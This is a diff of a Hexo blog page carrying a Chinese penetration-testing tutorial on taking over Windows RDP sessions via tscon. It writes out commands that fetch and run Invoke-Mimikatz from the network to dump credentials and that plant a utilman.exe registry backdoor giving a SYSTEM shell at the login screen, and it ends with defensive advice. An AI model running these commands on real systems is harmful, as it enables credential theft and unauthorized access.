@@ -1,290 +1,222 @@
-
-
 <!DOCTYPE html>
-<html lang="">
-<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="">
-    <title>利用tscon未授权登录远程桌面 | c1y2m3’blog</title>
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
 
-    <!-- Open Graph -->
-    <meta name="description" content="&amp;#x200B;    1&amp;#x3001; Windows&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E0B;&amp;#xFF0C;tscon&amp;#x53EF;&amp;#x88AB;&amp;#x7528;&amp;#x6765;&amp;#x5207;&amp;#x6362;&amp;#x8FDC;&amp;#x7A0B;&amp;#x684C;&amp;#x9762;&amp;#x7684;&amp;#x4F1A;&amp;#x8BDD;&amp;#x3002;&amp;#x6B63;&amp;#x5E38;&amp;#x60C">
-<meta property="og:type" content="article">
-<meta property="og:title" content="利用tscon未授权登录远程桌面">
-<meta property="og:url" content="http://yoursite.com/2019/01/17/---/index.html">
-<meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="&amp;#x200B;    1&amp;#x3001; Windows&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E0B;&amp;#xFF0C;tscon&amp;#x53EF;&amp;#x88AB;&amp;#x7528;&amp;#x6765;&amp;#x5207;&amp;#x6362;&amp;#x8FDC;&amp;#x7A0B;&amp;#x684C;&amp;#x9762;&amp;#x7684;&amp;#x4F1A;&amp;#x8BDD;&amp;#x3002;&amp;#x6B63;&amp;#x5E38;&amp;#x60C">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5">
-<meta property="og:image" content="https://mochazz.github.io/img/pentest1/p14.png">
-<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956">
-<meta property="og:updated_time" content="2019-02-04T04:48:05.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用tscon未授权登录远程桌面">
-<meta name="twitter:description" content="&amp;#x200B;    1&amp;#x3001; Windows&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E0B;&amp;#xFF0C;tscon&amp;#x53EF;&amp;#x88AB;&amp;#x7528;&amp;#x6765;&amp;#x5207;&amp;#x6362;&amp;#x8FDC;&amp;#x7A0B;&amp;#x684C;&amp;#x9762;&amp;#x7684;&amp;#x4F1A;&amp;#x8BDD;&amp;#x3002;&amp;#x6B63;&amp;#x5E38;&amp;#x60C">
-<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb">
-
-    <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Person",
-  "email": "mailto:",
-  "image": "",
-  "name": "John Doe",
-  "url": "http://yoursite.com"
-}
-</script>
-    <script>
-    var algoliaEnabled = false;
-    
-</script>
-
-    
-
-    
-    
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-    
-    
-    
-        <!-- stylesheets list from config.yml -->
+    <title>
         
-        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
+        利用tscon未授权登录远程桌面 - undefined
         
-        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
-        
-        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
-        
-    
+    </title>
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
-<body id="body" style="margin-bottom: 0;" class="pushable">
 
-    <div class="ui top fixed menu">
-        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
-    </div>
+<body>
 
-    <div id="menu-sidebar" class="ui left vertical sidebar menu">
-
-    <div id="sidebar-top">
-        <div class="content">
-            <h3>c1y2m3’blog</h3>
-        </div>
-    </div>
-    <div class="ui container sidebar-card">
-    <div class="ui people shape content">
-        <div class="active side">
-            <div class="ui card">
-                <div class="image">
-                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
-                </div>
-                <div class="content">
-                    <a class="header">John Doe</a>
-                    
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                        
-                    </div>
-
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
-    
-    
-
-    
-
-    
-    <a href="/index.html" class="item">
-        <i class="home icon"></i>
-        HOME
-    </a>
-
-    
-
-    
+<div class="index-about">
+    <i>  </i>
 </div>
 
-    <div class="pusher body-content">
-        <div id="content" class="ui main container">
-            <!--<div class="ui one column grid">-->
-                <!--<div class="column">-->
-                    <!--<div class="ui main container">-->
-                        <div id="post----" class="ui main container article-type-post">
-
+<div class="index-container">
     
-
-    <div class="ui divided grid">
-
-        <div class="two column row" id="article-content">
-
-            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
-                
-
-<h1 class="ui header">
-    
-    利用tscon未授权登录远程桌面
-</h1>
-
-
-
-                <div class="article-inner">
-
-                    <div class="article-entry" itemprop="articleBody">
-                        
-                        <p>&#x200B;    1&#x3001; Windows&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;tscon&#x53EF;&#x88AB;&#x7528;&#x6765;&#x5207;&#x6362;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x7684;&#x4F1A;&#x8BDD;&#x3002;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5207;&#x6362;&#x4F1A;&#x8BDD;&#x65F6;&#x9700;&#x8981;&#x63D0;&#x4F9B;&#x767B;&#x5F55;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x901A;&#x8FC7;&#x7279;&#x6B8A;&#x7684;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x80FD;&#x591F;&#x7ED5;&#x8FC7;&#x9A8C;&#x8BC1;&#xFF0C;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x5B9E;&#x73B0;&#x672A;&#x6388;&#x6743;&#x767B;&#x5F55;&#x3002;<br>&#x200B;<br>&#x53C2;&#x8003;&#x4E09;&#x597D;&#x5B66;&#x751F;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x6545;&#x7ECF;&#x8FC7;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#xFF0C;&#x53D1;&#x73B0;&#x8FD8;&#x662F;&#x6709;&#x5F88;&#x591A;&#x51FA;&#x8DEF;&#xFF0C;&#x6545;&#x5C0F;&#x7ED3;&#x4E0B;&#x81EA;&#x5DF1;&#x7684;&#x5C0F;&#x601D;&#x8DEF;&#x3002;</p>
-<p>&#x5BF9;&#x4E8E;&#x5F00;&#x542F;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x670D;&#x52A1;&#x7684;Windows&#x7CFB;&#x7EDF;&#xFF0C;&#x5F53;&#x6709;&#x591A;&#x4E2A;&#x7528;&#x6237;&#x767B;&#x5F55;&#x8BE5;&#x7CFB;&#x7EDF;&#x65F6;&#xFF0C;&#x4F1A;&#x4EA7;&#x751F;&#x591A;&#x4E2A;&#x4F1A;&#x8BDD;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br>&#x6D4B;&#x8BD5;&#x7CFB;&#x7EDF;&#xFF1A; Server 2008 R2<br>&#x7528;&#x6237;Administrator&#x4E3A;&#x672C;&#x5730;&#x767B;&#x5F55;  </p>
-<p>&#x7528;&#x6237;college&#x901A;&#x8FC7;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x670D;&#x52A1;(RDP)&#x60F3;&#x8981;&#x5207;&#x6362;&#x81F3;&#x7528;&#x6237;administraror,&#x53EF;&#x901A;&#x8FC7;&#x53F3;&#x952E;-Connect&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x63A5;&#x7740;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x5373;&#x53EF;&#x3002;</p>
-<p>&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb"><img src="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb" alt="" class="ui centered image"></a></p>
-<p>tscon&#x662F;&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x4F7F;&#x7528;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x5B9E;&#x73B0;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
-<p>&#x9996;&#x5148;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x5BF9;&#x5E94;&#x7684;sessionid,&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24"><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24" alt="" class="ui centered image"></a></p>
-<p>&#x7528;&#x6237;administrator&#x5BF9;&#x5E94;&#x7684;sessionsid&#x4E3A;2 </p>
-<p>&#x901A;&#x8FC7;tscon&#x5207;&#x6362;&#x5230;&#x7528;&#x6237;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x684C;&#x9762;&#xFF0C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /PASSWORD&#xFF1A;XXXXX</span><br></pre></td></tr></table></figure>
-<p>&#x901A;&#x8FC7;&#x4E09;&#x597D;&#x5B66;&#x751F;&#x5E08;&#x5085;&#x7684;&#x65B9;&#x6CD5;&#x3001;&#x83B7;&#x53D6;System&#x6743;&#x9650;&#xFF0C;&#x5C31;&#x80FD;&#x7ED5;&#x8FC7;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x76F4;&#x63A5;&#x5207;&#x6362;&#x3002;</p>
-<p>&#x53C2;&#x8003; &#xFF1A;</p>
-<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">&#x6E17;&#x900F;&#x6280;&#x5DE7;&#x2014;&#x2014;&#x4ECE;Admin&#x6743;&#x9650;&#x5207;&#x6362;&#x5230;System&#x6743;&#x9650;</a></p>
-<p>&#x4F46;&#x5728;&#x9ED8;&#x4E9B;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5E38;&#x5E38;&#x88AB;&#x7CFB;&#x7EDF;&#x7B56;&#x7565;&#x963B;&#x65AD;&#x4E86;&#xFF0C;&#x5E38;&#x5E38;&#x4E0D;&#x5F97;&#x4EE5;&#x5B9E;&#x73B0;&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076"><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt="" class="ui centered image"></a></p>
-<p>&#x901A;&#x5E38;&#x4E00;&#x822C;&#x62FF;&#x5230;webshell&#x540E;&#x3001;&#x8FDB;&#x884C;mimikatz&#x4E00;&#x6CE2;&#x8F93;&#x51FA;&#x3001;dump&#x51FA;&#x7528;&#x6237;&#x7EC4;&#x7684;ntlm&#xFF0C;&#x5982;&#x679C;exe&#x88AB;&#x6740;&#x8F6F;&#x62E6;&#x622A;&#x4E86;&#x6216;&#x7EC4;&#x7B56;&#x7565;&#x9650;&#x5236;&#x4E86;&#xFF0C; &#x90A3;&#x4F9D;&#x7136;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Powershell&#x8FDB;&#x884C;&#x64CD;&#x4F5C;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
-<p>&#x7531;&#x4E8E;&#x83DC;&#x5200;&#x5904;&#x4E8E;&#x975E;&#x4EA4;&#x6362;&#x6A21;&#x5F0F;&#xFF0C;&#x9ED8;&#x4E9B;&#x60C5;&#x51B5;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x8FD0;&#x884C;&#x7A81;&#x7834;UAC&#x7684;&#x8FD0;&#x884C;&#x7684;&#x4E0B;&#xFF0C;&#x53EF;&#x7528;&#x8F85;&#x52A9;&#x5DE5;&#x5177;&#x7BA1;&#x7406;&#x5668;&#x540E;&#x95E8;(&#x653E;&#x5927;&#x955C;&#x540E;&#x95E8;&#x539F;&#x7406;&#x76F8;&#x540C;&#xFF0C;&#x8FDB;&#x7A0B;&#x4E3A;sethc.exe)&#x914D;&#x5408;tscon&#x7ED5;&#x8FC7;&#x7CFB;&#x7EDF;&#x767B;&#x5F55;&#x754C;&#x9762;</p>
-<p>&#x8C03;&#x7528;&#x8F85;&#x52A9;&#x5DE5;&#x5177;&#x7BA1;&#x7406;&#x5668;&#x7684;&#x5FEB;&#x6377;&#x952E;: Win+U<br>&#x901A;&#x8FC7;&#x6CE8;&#x518C;&#x8868;&#x52AB;&#x6301;&#x5B9E;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;&#x7684;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-<p>&#x5728;&#x767B;&#x5F55;&#x754C;&#x9762;&#x542F;&#x52A8;&#x8F85;&#x52A9;&#x5DE5;&#x5177;&#x7BA1;&#x7406;&#x5668;&#xFF0C;&#x5F39;&#x51FA;cmd.exe&#xFF0C;&#x6743;&#x9650;&#x4E3A;system&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>
-<p>&#x5373;&#x53EF;&#x6210;&#x529F;&#x4ECE;&#x672C;&#x5730;&#x7528;&#x6237;&#x7EC4;&#x8DF3;&#x5165;&#x57DF;&#x4E3B;&#x673A;&#x5185;&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5"><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5" alt="" class="ui centered image"></a></p>
-<p>&#x5F53;&#x7136;&#xFF0C;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x670D;&#x52A1;&#x7684;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x52AB;&#x6301;&#x3002;</p>
-<p><a class="magnific-img" href="https://mochazz.github.io/img/pentest1/p14.png"><img src="https://mochazz.github.io/img/pentest1/p14.png" alt="" class="ui centered image"></a></p>
-<p><strong>&#x8865;&#x5145;&#xFF1A;</strong></p>
-<p>&#x5728;&#x767B;&#x5F55;&#x754C;&#x9762;&#x72B6;&#x6001;&#x4E0B;&#xFF0C;&#x964D;&#x6743;&#x65B9;&#x6CD5;&#x53D7;&#x9650;&#xFF0C;SelectMyParent&#x548C;Invoke-TokenManipulation.ps1&#x5747;&#x62A5;&#x9519;</p>
-<p>&#x4F7F;&#x7528;incognito&#x80FD;&#x591F;&#x6210;&#x529F;&#x964D;&#x6743;&#xFF0C;&#x4F46;&#x662F;&#x64CD;&#x4F5C;&#x53D7;&#x9650;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956"><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956" alt="" class="ui centered image"></a></p>
-<h2 id="&#x9632;&#x5FA1;&#x5EFA;&#x8BAE;&#xFF1A;"><a href="#&#x9632;&#x5FA1;&#x5EFA;&#x8BAE;&#xFF1A;" class="headerlink" title="&#x9632;&#x5FA1;&#x5EFA;&#x8BAE;&#xFF1A;"></a>&#x9632;&#x5FA1;&#x5EFA;&#x8BAE;&#xFF1A;</h2><p>&#x5EFA;&#x8BAE;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x6CE8;&#x9500;&#x7528;&#x6237;&#x7684;&#x65B9;&#x5F0F;&#x65AD;&#x5F00;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#xFF0C;&#x6CE8;&#x9500;&#x540E;&#xFF0C;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;tscon&#x83B7;&#x5F97;&#x684C;&#x9762;&#x4F1A;&#x8BDD;</p>
-<p>&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x7684;&#x767B;&#x5F55;&#x65E5;&#x5FD7;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x5148;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x540E;&#x624D;&#x80FD;&#x505A;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;&#xFF1A;&#x672A;&#x6388;&#x6743;&#x5207;&#x6362;&#x684C;&#x9762;&#x4F1A;&#x8BDD;</p>
-<p>&#x5BF9;&#x4E8E;Windows&#x7CFB;&#x7EDF;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x653B;&#x51FB;&#x8005;&#x5982;&#x679C;&#x83B7;&#x5F97;&#x4E86;&#x7CFB;&#x7EDF;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF0C;&#x80FD;&#x591F;&#x5229;&#x7528;&#x653E;&#x5927;&#x955C;&#x548C;&#x8F85;&#x52A9;&#x5DE5;&#x5177;&#x7BA1;&#x7406;&#x5668;&#x540E;&#x95E8;&#x5B9E;&#x73B0;&#x672A;&#x6388;&#x6743;&#x767B;&#x5F55;</p>
-
-                        
-                    </div>
-
-                    
-                    
-                    
-
-                    <div class="description post-description">
-    <span class="post-description-item">
-        <time datetime="2019-01-17T08:56:14.000Z" itemprop="datePublished">2019-01-17</time>
-
-    </span>
-    <span class="post-description-item">
+    <div class="index-left">
         
-    </span>
-</div>
-
-                </div>
-                
-                <div id="pagination" class="nav-web ui text container pagination">
-
-    <div class="ui stackable two column divided grid container">
-        <div class="row">
-            <div class="column nav-left">
-                
-
-                <a href="/c1y2m3.github.io/2019/01/19/ 浅析Windows本地认证 /" class="ui tiny button">
-
-                    <i class="angle left icon"></i>
-                    
-                    浅析Windows本地认证
-                    
-
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/c1y2m3.github.io/">
+        </div>
+        <div class="name">
+            <i>John Doe</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/c1y2m3.github.io/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
                 </a>
-
-                
-            </div>
-            <div class="column nav-right">
-                
-
-                <a href="/c1y2m3.github.io/2018/11/20/在Linux下文件包含漏洞的另类拿SHELL方法 /" class="ui tiny button">
-                    
-                    在Linux下文件包含漏洞的另类拿SHELL方法
-                    
-                    <i class="angle right icon"></i></a>
-                
-            </div>
-        </div>
-    </div>
-
-</div>
-                
-            </div>
-
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
             
-            <div class="three wide computer three wide tablet column">
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#防御建议："><span class="toc-text">防御建议：</span></a></li></ol>
+</div>
+    
+</div>
 
-                <div class="ui sticky article-toc" id="article-toc">
-                    <!-- toc -->
-                    <ol class="ui ordered list"><li><a href="#防御建议："><span>防御建议：</span></a></li></ol>
-                </div>
 
-            </div>
-            
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
 
         </div>
     </div>
 </div>
 
-
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
+        <div class="index-about-mobile">
+            <i>  </i>
         </div>
-        <div class="ui vertical footer segment">
-    <div class="ui center aligned container">
-        <div class="ui inverted section divider"></div>
-        &copy; 2019 <a href="/">John Doe</a>,
-        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        利用tscon未授权登录远程桌面
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-01-17 16:56:14</span></span>
+        
+        
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <p>​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>​<br>参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。</p>
+<p>对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：<br>测试系统： Server 2008 R2<br>用户Administrator为本地登录  </p>
+<p>用户college通过远程桌面服务(RDP)想要切换至用户administraror,可通过右键-Connect进行连接，接着输入密码即可。</p>
+<p>如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb" alt=""></p>
+<p>tscon是命令行下使用的工具，可实现相同的功能。</p>
+<p>首先获取用户对应的sessionid,执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24" alt=""></p>
+<p>用户administrator对应的sessionsid为2 </p>
+<p>通过tscon切换到用户管理员的桌面，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /PASSWORD：XXXXX</span><br></pre></td></tr></table></figure>
+<p>通过三好学生师傅的方法、获取System权限，就能绕过输入密码的过程，直接切换。</p>
+<p>参考 ：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a></p>
+<p>但在默些环境中，常常被系统策略阻断了，常常不得以实现。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt=""></p>
+<p>通常一般拿到webshell后、进行mimikatz一波输出、dump出用户组的ntlm，如果exe被杀软拦截了或组策略限制了， 那依然还是可以使用Powershell进行操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+<p>由于菜刀处于非交换模式，默些情况导致无法运行突破UAC的运行的下，可用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)配合tscon绕过系统登录界面</p>
+<p>调用辅助工具管理器的快捷键: Win+U<br>通过注册表劫持实现后门，修改注册表的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图：</p>
+<p>即可成功从本地用户组跳入域主机内。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5" alt=""></p>
+<p>当然，也是可以通过创建服务的方法进行劫持。</p>
+<p><img src="https://mochazz.github.io/img/pentest1/p14.png" alt=""></p>
+<p><strong>补充：</strong></p>
+<p>在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错</p>
+<p>使用incognito能够成功降权，但是操作受限如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956" alt=""></p>
+<h2 id="防御建议："><a href="#防御建议：" class="headerlink" title="防御建议："></a>防御建议：</h2><p>建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话</p>
+<p>监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话</p>
+<p>对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
     </div>
 </div>
 
     </div>
+</div>
 
 
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
+        
 
-<!-- scripts list from theme config.yml -->
+        
 
-<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
 
-<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
-
-<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
-
-<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/c1y2m3.github.io/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
